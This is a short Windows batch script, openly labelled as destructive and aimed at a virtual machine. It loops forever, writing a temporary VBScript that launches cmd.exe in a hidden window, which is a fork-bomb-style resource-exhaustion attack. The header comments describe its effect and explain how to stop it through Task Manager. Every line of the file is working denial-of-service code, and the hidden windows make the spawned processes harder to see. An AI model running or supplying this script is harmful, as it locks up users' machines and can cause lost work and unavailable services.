@echo off
REM --- IMPORTANT: This script will infinitely launch hidden terminal processes. ---
REM --- It will quickly consume system resources and make your VM unresponsive. ---
REM --- To stop it: IMMEDIATELY close the main batch script window (if visible) ---
REM --- AND open Task Manager (Ctrl+Shift+Esc), go to the "Details" tab, ---
REM --- sort by "Name", find all "cmd.exe" processes, select them, and click "End task". ---
REM -----------------------------------------------------------------------------

:loop
REM Create a temporary VBScript file to launch cmd.exe invisibly
echo Set WshShell = CreateObject("WScript.Shell") > %TEMP%\launch_hidden_cmd.vbs
echo WshShell.Run "cmd.exe", 0, False >> %TEMP%\launch_hidden_cmd.vbs

REM Execute the VBScript using wscript.exe, which runs it in the background
start /b wscript.exe //B //Nologo %TEMP%\launch_hidden_cmd.vbs

REM Optional: Add a very small delay to prevent immediate overwhelming, though it will still be fast
REM timeout /t 0.1 /nobreak > nul

REM Clean up the temporary VBScript file (optional, but good practice)
del %TEMP%\launch_hidden_cmd.vbs

goto loop